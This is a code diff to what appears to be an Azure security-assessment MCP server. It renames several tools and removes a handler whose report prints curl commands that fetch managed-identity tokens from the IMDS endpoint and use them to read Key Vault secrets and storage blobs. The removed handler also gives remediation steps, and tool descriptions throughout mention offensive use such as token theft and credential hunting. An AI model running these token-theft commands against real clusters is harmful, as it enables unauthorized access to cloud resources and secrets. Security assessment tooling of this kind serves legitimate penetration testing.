@@ -315,7 +315,7 @@ server.setRequestHandler(ListToolsRequestSchema, async () => {
         },
       },
       {
-        name: "analyze_key_vault_security",
+        name: "analyze_keyvault_security",
         description: "Key Vault security assessment. Checks: soft delete disabled (data loss risk), purge protection disabled, public network access enabled, RBAC vs Access Policies, secret/certificate expiration, diagnostic logging. Returns risk-scored findings (CRITICAL/HIGH/MEDIUM/LOW) with remediation guidance.",
         inputSchema: {
           type: "object",
@@ -333,7 +333,7 @@ server.setRequestHandler(ListToolsRequestSchema, async () => {
         },
       },
       {
-        name: "analyze_cosmos_db_security",
+        name: "analyze_cosmosdb_security",
         description: "Cosmos DB security analyzer. Checks: public network access enabled, firewall rules (IP restrictions), encryption at rest, automatic failover, backup retention policy, virtual network rules. Returns security findings with compliance mapping.",
         inputSchema: {
           type: "object",
@@ -387,7 +387,7 @@ server.setRequestHandler(ListToolsRequestSchema, async () => {
         },
       },
       {
-        name: "scan_container_registries",
+        name: "scan_acr_security",
         description: "Azure Container Registry (ACR) security scanner. Checks: admin user enabled (high risk), public network access, vulnerability scanning enabled (Defender for Containers), content trust (image signing), network rules, anonymous pull access. Returns container security findings.",
         inputSchema: {
           type: "object",
@@ -595,28 +595,6 @@ server.setRequestHandler(ListToolsRequestSchema, async () => {
         },
       },
       {
-        name: "test_aks_imds_access",
-        description: "Test Azure Instance Metadata Service (IMDS) accessibility from AKS cluster. Checks if IMDS endpoint 169.254.169.254 is reachable, tests managed identity token retrieval, validates network restrictions. OFFENSIVE USE: Critical for pod escape attacks - if IMDS accessible from pods, can steal managed identity tokens to access Azure resources (Key Vault, Storage, etc.).",
-        inputSchema: {
-          type: "object",
-          properties: {
-            subscriptionId: {
-              type: "string",
-              description: "Azure subscription ID",
-            },
-            resourceGroup: {
-              type: "string",
-              description: "Resource group name containing AKS cluster",
-            },
-            clusterName: {
-              type: "string",
-              description: "AKS cluster name",
-            },
-          },
-          required: ["subscriptionId", "resourceGroup", "clusterName"],
-        },
-      },
-      {
         name: "scan_azure_devops",
         description: "Azure DevOps security scanner. Enumerates: organizations, projects, repositories, pipelines, service connections, variable groups, PAT tokens. Checks for: exposed secrets in repos, over-privileged service connections, insecure pipeline configurations, leaked credentials. OFFENSIVE USE: Find deployment credentials, API keys in source code, service principal secrets in pipelines.",
         inputSchema: {
@@ -716,7 +694,7 @@ server.setRequestHandler(ListToolsRequestSchema, async () => {
         },
       },
       {
-        name: "analyze_rbac_privilege_escalation",
+        name: "analyze_rbac_privesc",
         description: "Deep RBAC analysis for privilege escalation paths: role assignment permissions, custom role vulnerabilities, subscription-level access, management group permissions",
         inputSchema: {
           type: "object",
@@ -770,8 +748,8 @@ server.setRequestHandler(ListToolsRequestSchema, async () => {
         },
       },
       {
-        name: "hunt_aks_secrets",
-        description: "Hunt for secrets in AKS cluster: enumerate K8s secrets, secrets in env vars, Azure Key Vault access, storage account credentials, ConfigMap secrets, mounted secret files, service principal credentials, container registry credentials. Returns extraction commands and remediation.",
+        name: "scan_aks_secrets",
+        description: "Scan for secrets in AKS cluster: enumerate K8s secrets, secrets in env vars, Azure Key Vault access, storage account credentials, ConfigMap secrets, mounted secret files, service principal credentials, container registry credentials. Returns extraction commands and remediation.",
         inputSchema: {
           type: "object",
           properties: {
@@ -840,8 +818,8 @@ server.setRequestHandler(ListToolsRequestSchema, async () => {
         },
       },
       {
-        name: "test_aks_imds_full_recon",
-        description: "🔴 IMDS EXPLOITATION & FULL RECONNAISSANCE - Complete attack chain: IMDS token theft → permission enumeration → resource discovery → data plane access testing. Tests Pod→IMDS→Managed Identity→Azure Resources attack path. Enumerates all accessible subscriptions, resource groups, resources, role assignments, and tests data plane access (Storage, Key Vault, ACR).",
+        name: "scan_aks_imds",
+        description: "IMDS exploitation and full reconnaissance - Complete attack chain: IMDS token theft, permission enumeration, resource discovery, data plane access testing. Tests Pod-to-IMDS-to-Azure attack path. Enumerates accessible subscriptions, resource groups, resources, role assignments, and tests data plane access (Storage, Key Vault, ACR).",
         inputSchema: {
           type: "object",
           properties: {
@@ -1166,7 +1144,7 @@ enumerate_resources subscriptionId="YOUR_SUB" location="eastus,westeurope"
 **Example:**
   subscriptionId: "00000000-0000-0000-0000-000000000000"
 
-### 13. analyze_cosmos_db_security
+### 13. analyze_cosmosdb_security
 **Description:** Cosmos DB security analyzer
 **Use Cases:**
   - Check public network access
@@ -1347,13 +1325,13 @@ enumerate_resources subscriptionId="YOUR_SUB" location="eastus,westeurope"
   resourceGroup: "my-resource-group"
   clusterName: "my-aks-cluster"
 
-### 24. test_aks_imds_access
-**Description:** Test Azure Instance Metadata Service (IMDS) accessibility from AKS
+### 24. scan_aks_imds
+**Description:** IMDS exploitation and full Azure reconnaissance from AKS
 **Use Cases:**
-  - Check if IMDS endpoint 169.254.169.254 is reachable
-  - Test managed identity token retrieval
-  - Validate network restrictions
-  - Critical for pod escape attacks
+  - Test IMDS endpoint 169.254.169.254 accessibility
+  - Steal managed identity tokens
+  - Enumerate subscriptions, resource groups, resources
+  - Test data plane access (ACR, KeyVault, Storage)
 **Parameters:**
   - subscriptionId (required): Azure subscription ID
   - resourceGroup (required): Resource group containing AKS cluster
@@ -1411,13 +1389,13 @@ enumerate_resources subscriptionId="YOUR_SUB" location="eastus,westeurope"
 14. \`check_key_vault_security\` - Audit secrets management
 15. \`analyze_vm_security\` - Check compute security
 16. \`check_container_registries\` - Audit container security
-17. \`analyze_cosmos_db_security\` - Check NoSQL database security
+17. \`analyze_cosmosdb_security\` - Check NoSQL database security
 
 ### Phase 4: Kubernetes/AKS Assessment
 18. \`scan_aks_clusters\` - Check cluster security configuration
 19. \`enumerate_aks_identities\` - Map cluster identities and permissions
 20. \`scan_aks_node_security\` - Audit node security
-21. \`test_aks_imds_access\` - Test for pod escape vulnerabilities
+21. \`scan_aks_imds\` - IMDS exploitation & token theft testing
 22. \`get_aks_credentials\` - Extract kubeconfig for manual testing
 
 ### Phase 5: DevOps Security
@@ -2428,7 +2406,7 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
         };
       }
 
-      case "analyze_key_vault_security": {
+      case "analyze_keyvault_security": {
         const { subscriptionId, resourceGroup } = request.params.arguments as {
           subscriptionId: string;
           resourceGroup?: string;
@@ -2519,7 +2497,7 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
         };
       }
 
-      case "analyze_cosmos_db_security": {
+      case "analyze_cosmosdb_security": {
         const { subscriptionId, resourceGroup } = request.params.arguments as {
           subscriptionId: string;
           resourceGroup?: string;
@@ -2785,7 +2763,7 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
         };
       }
 
-      case "scan_container_registries": {
+      case "scan_acr_security": {
         const { subscriptionId, resourceGroup } = request.params.arguments as {
           subscriptionId: string;
           resourceGroup?: string;
@@ -4228,158 +4206,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
         }
       }
 
-      case "test_aks_imds_access": {
-        const { subscriptionId, resourceGroup, clusterName } = request.params.arguments as {
-          subscriptionId: string;
-          resourceGroup: string;
-          clusterName: string;
-        };
-
-        const containerClient = new ContainerServiceClient(credential, subscriptionId);
-        
-        try {
-          const cluster = await containerClient.managedClusters.get(resourceGroup, clusterName);
-          
-          let report = `# AKS IMDS Access Test - ${clusterName}\n\n`;
-          
-          report += `## Azure Instance Metadata Service (IMDS)\n`;
-          report += `**Endpoint:** http://169.254.169.254\n`;
-          report += `**Risk:** If accessible from pods, allows managed identity token theft\n\n`;
-          
-          report += `## Current Cluster Configuration\n`;
-          report += `- **Private Cluster:** ${cluster.apiServerAccessProfile?.enablePrivateCluster ? "Yes" : "No"}\n`;
-          report += `- **Network Plugin:** ${cluster.networkProfile?.networkPlugin}\n`;
-          report += `- **Network Policy:** ${cluster.networkProfile?.networkPolicy || "None"}\n`;
-          report += `- **Pod CIDR:** ${cluster.networkProfile?.podCidr || "N/A"}\n`;
-          report += `- **Service CIDR:** ${cluster.networkProfile?.serviceCidr || "N/A"}\n\n`;
-          
-          report += `## IMDS Exploitation Test Procedure\n\n`;
-          report += `### Step 1: Deploy Test Pod\n\`\`\`bash\n`;
-          report += `kubectl run imds-test --image=alpine:latest --restart=Never --rm -it -- /bin/sh\n\`\`\`\n\n`;
-          
-          report += `### Step 2: Install curl (inside pod)\n\`\`\`bash\n`;
-          report += `apk add --no-cache curl jq\n\`\`\`\n\n`;
-          
-          report += `### Step 3: Test IMDS Reachability\n\`\`\`bash\n`;
-          report += `# Test basic connectivity\n`;
-          report += `curl -v -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"\n\`\`\`\n\n`;
-          
-          report += `**Expected Results:**\n`;
-          report += `- [OK] **If accessible:** JSON response with VM metadata -> IMDS is reachable (HIGH RISK)\n`;
-          report += `- [FAIL] **If blocked:** Connection timeout/refused -> IMDS properly restricted\n\n`;
-          
-          report += `### Step 4: Extract Managed Identity Token (if IMDS accessible)\n\`\`\`bash\n`;
-          report += `# Get token for Azure Resource Manager\n`;
-          report += `TOKEN=$(curl -s -H "Metadata: true" \\\n`;
-          report += `  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \\\n`;
-          report += `  | jq -r .access_token)\n\n`;
-          report += `echo "Token: $TOKEN"\n\n`;
-          report += `# Decode token to see identity\n`;
-          report += `echo $TOKEN | cut -d'.' -f2 | base64 -d | jq\n\`\`\`\n\n`;
-          
-          report += `### Step 5: Use Token to Access Azure Resources\n\`\`\`bash\n`;
-          report += `# List subscriptions\n`;
-          report += `curl -H "Authorization: Bearer $TOKEN" \\\n`;
-          report += `  "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq\n\n`;
-          report += `# Get token for Key Vault\n`;
-          report += `KV_TOKEN=$(curl -s -H "Metadata: true" \\\n`;
-          report += `  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \\\n`;
-          report += `  | jq -r .access_token)\n\n`;
-          report += `# Access Key Vault secret\n`;
-          report += `curl -H "Authorization: Bearer $KV_TOKEN" \\\n`;
-          report += `  "https://<VAULT_NAME>.vault.azure.net/secrets/<SECRET_NAME>?api-version=7.2" | jq\n\n`;
-          report += `# Get token for Storage\n`;
-          report += `STORAGE_TOKEN=$(curl -s -H "Metadata: true" \\\n`;
-          report += `  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" \\\n`;
-          report += `  | jq -r .access_token)\n\n`;
-          report += `# List storage blobs\n`;
-          report += `curl -H "Authorization: Bearer $STORAGE_TOKEN" \\\n`;
-          report += `  -H "x-ms-version: 2020-04-08" \\\n`;
-          report += `  "https://<STORAGE_ACCOUNT>.blob.core.windows.net/<CONTAINER>?restype=container&comp=list"\n\`\`\`\n\n`;
-          
-          report += `## Risk Assessment\n\n`;
-          
-          if (!cluster.networkProfile?.networkPolicy) {
-            report += `### [FAIL] CRITICAL: No Network Policy Configured\n`;
-            report += `- Pods can freely access IMDS endpoint\n`;
-            report += `- Any compromised pod = instant managed identity token theft\n`;
-            report += `- Attacker can access Azure resources based on identity's RBAC\n\n`;
-          } else {
-            report += `### [OK] Network Policy Enabled: ${cluster.networkProfile.networkPolicy}\n`;
-            report += `- Network policies can restrict IMDS access\n`;
-            report += `- **Must verify** that policies actually block 169.254.169.254\n\n`;
-          }
-          
-          report += `## Attack Scenario\n\n`;
-          report += `1. **Entry Point:** Attacker gains code execution in pod (e.g., via vulnerable app)\n`;
-          report += `2. **IMDS Access:** From pod, access http://169.254.169.254 to get managed identity token\n`;
-          report += `3. **Token Theft:** Extract OAuth token for Azure resources\n`;
-          report += `4. **Privilege Escalation:** Use token to access Azure resources\n`;
-          report += `5. **Impact:** Based on cluster identity's RBAC permissions:\n`;
-          report += `   - **Contributor/Owner** → Full subscription control\n`;
-          report += `   - **Key Vault access** → Extract all secrets\n`;
-          report += `   - **Storage access** → Read/modify production data\n`;
-          report += `   - **VM access** → Lateral movement to other VMs\n\n`;
-          
-          report += `## Remediation Strategies\n\n`;
-          report += `### Option 1: Block IMDS with Network Policy\n\`\`\`yaml\n`;
-          report += `apiVersion: networking.k8s.io/v1\n`;
-          report += `kind: NetworkPolicy\n`;
-          report += `metadata:\n`;
-          report += `  name: block-imds\n`;
-          report += `  namespace: default\n`;
-          report += `spec:\n`;
-          report += `  podSelector: {}\n`;
-          report += `  policyTypes:\n`;
-          report += `  - Egress\n`;
-          report += `  egress:\n`;
-          report += `  - to:\n`;
-          report += `    - ipBlock:\n`;
-          report += `        cidr: 0.0.0.0/0\n`;
-          report += `        except:\n`;
-          report += `        - 169.254.169.254/32\n`;
-          report += `\`\`\`\n\n`;
-          
-          report += `### Option 2: Use Workload Identity (Recommended)\n`;
-          report += `- Replaces cluster-wide managed identity with per-pod identities\n`;
-          report += `- Enable: \`az aks update --enable-workload-identity\`\n`;
-          report += `- Pods get tokens via Kubernetes service account projection, not IMDS\n`;
-          report += `- Provides better isolation and least privilege\n\n`;
-          
-          report += `### Option 3: AAD Pod Identity (Legacy)\n`;
-          report += `- Similar to Workload Identity but older implementation\n`;
-          report += `- Uses MIC (Managed Identity Controller) to intercept IMDS\n`;
-          report += `- Being replaced by Workload Identity\n\n`;
-          
-          report += `### Option 4: Restrict Cluster Identity RBAC\n`;
-          report += `- Reduce cluster managed identity permissions to minimum\n`;
-          report += `- Use **Reader** instead of **Contributor**\n`;
-          report += `- Grant specific resource access via separate managed identities\n\n`;
-          
-          report += `## Verification Commands\n\n`;
-          report += `\`\`\`bash\n`;
-          report += `# Check if workload identity enabled\n`;
-          report += `az aks show --resource-group ${resourceGroup} --name ${clusterName} --query "oidcIssuerProfile.enabled"\n\n`;
-          report += `# Check network policies\n`;
-          report += `kubectl get networkpolicies --all-namespaces\n\n`;
-          report += `# Test IMDS from pod (should fail if blocked)\n`;
-          report += `kubectl run test --image=alpine --restart=Never --rm -it -- sh -c "apk add curl; curl -m 5 http://169.254.169.254"\n`;
-          report += `\`\`\`\n`;
-
-          return {
-            content: [{ type: "text", text: report }],
-          };
-        } catch (error: any) {
-          return {
-            content: [{
-              type: "text",
-              text: `Error testing IMDS access: ${error.message}`
-            }],
-            isError: true,
-          };
-        }
-      }
-
       case "scan_azure_devops": {
         const { organizationUrl, personalAccessToken, scanRepositories, scanPipelines } = request.params.arguments as {
           organizationUrl: string;
@@ -4862,7 +4688,7 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
         }
       }
 
-      case "analyze_rbac_privilege_escalation": {
+      case "analyze_rbac_privesc": {
         const { subscriptionId, targetPrincipal } = request.params.arguments as {
           subscriptionId: string;
           targetPrincipal?: string;
@@ -5148,7 +4974,7 @@ ${saAnalysisCommands}`;
         }
       }
 
-      case "hunt_aks_secrets": {
+      case "scan_aks_secrets": {
         const { subscriptionId, resourceGroup, clusterName } = request.params.arguments as {
           subscriptionId: string;
           resourceGroup: string;
@@ -7356,7 +7182,7 @@ kubectl --token=\\$TOKEN get pods -A
         }
       }
 
-      case "test_aks_imds_full_recon": {
+      case "scan_aks_imds": {
         const { subscriptionId, resourceGroup, clusterName, namespace, podName, deepScan = true, testDataPlane = true } = request.params.arguments as {
           subscriptionId: string;
           resourceGroup: string;
@@ -8206,15 +8032,15 @@ async function main() {
   console.error("=".repeat(70));
   console.error("\n[OK] Server Status: Running");
   console.error("Transport: stdio");
-  console.error("Version: 1.10.0");
-  console.error("\nAvailable Tools (38):");
+  console.error("Version: 1.10.1");
+  console.error("\nAvailable Tools (37):");
   console.error("\n  Multi-Location Scanning:");
   console.error("   1. list_active_locations     - Discover active Azure regions");
   console.error("   2. scan_all_locations        - Scan resources across regions");
   console.error("\n  Core Enumeration:");
   console.error("   3. enumerate_subscriptions   - List Azure subscriptions");
-  console.error("   4. enumerate_resource_groups - List resource groups (+ location filter)");
-  console.error("   5. enumerate_resources       - List resources (+ location filter)");
+  console.error("   4. enumerate_resource_groups - List resource groups");
+  console.error("   5. enumerate_resources       - List resources");
   console.error("   6. get_resource_details      - Detailed resource config");
   console.error("\n  Network & Storage Security:");
   console.error("   7. analyze_storage_security  - Storage misconfiguration scanner");
@@ -8223,24 +8049,24 @@ async function main() {
   console.error("   10. enumerate_rbac_assignments - Access control auditing");
   console.error("\n  Database, Secrets, Compute:");
   console.error("   11. scan_sql_databases       - SQL security & TDE encryption");
-  console.error("   12. analyze_key_vault_security - Key Vault configuration audit");
-  console.error("   13. analyze_cosmos_db_security - Cosmos DB exposure checker");
+  console.error("   12. analyze_keyvault_security - Key Vault configuration audit");
+  console.error("   13. analyze_cosmosdb_security - Cosmos DB exposure checker");
   console.error("   14. analyze_vm_security      - VM disk encryption & agents");
-  console.error("\n  AKS/Kubernetes Security (9 tools):");
-  console.error("   15. scan_aks_full            - FULL AKS SCAN (all checks in one!)");
+  console.error("\n  AKS/Kubernetes Security (8 tools):");
+  console.error("   15. scan_aks_full            - Full AKS security scan");
   console.error("   16. scan_aks_clusters        - AKS RBAC & network policies");
   console.error("   17. get_aks_credentials      - Extract kubeconfig & admin access");
   console.error("   18. enumerate_aks_identities - Map managed identities & RBAC");
   console.error("   19. scan_aks_node_security   - Node encryption & SSH analysis");
   console.error("   20. scan_aks_service_accounts - Service account security");
-  console.error("   21. hunt_aks_secrets         - Secret hunting guide");
-  console.error("   22. scan_aks_live            - LIVE K8s API security scan (20 checks)");
-  console.error("   23. test_aks_imds_full_recon - IMDS exploitation & full recon (NEW!)");
+  console.error("   21. scan_aks_secrets         - Kubernetes secret enumeration");
+  console.error("   22. scan_aks_live            - Live K8s API security scan (20 checks)");
+  console.error("   23. scan_aks_imds            - IMDS exploitation & full recon");
   console.error("\n  DevOps & Reporting:");
   console.error("   24. scan_azure_devops        - Azure DevOps security scanner");
   console.error("   25. generate_security_report - PDF/HTML/CSV report export");
   console.error("\n[TIP] Quick Start:");
-  console.error("   test_aks_imds_full_recon subscriptionId='SUB' resourceGroup='RG' clusterName='CLUSTER'");
+  console.error("   scan_aks_imds subscriptionId='SUB' resourceGroup='RG' clusterName='CLUSTER'");
   console.error("   scan_aks_live subscriptionId='SUB' resourceGroup='RG' clusterName='CLUSTER'");
   console.error("\nAuthentication: Using Azure CLI credentials (az login)");
   console.error("=".repeat(70) + "\n");
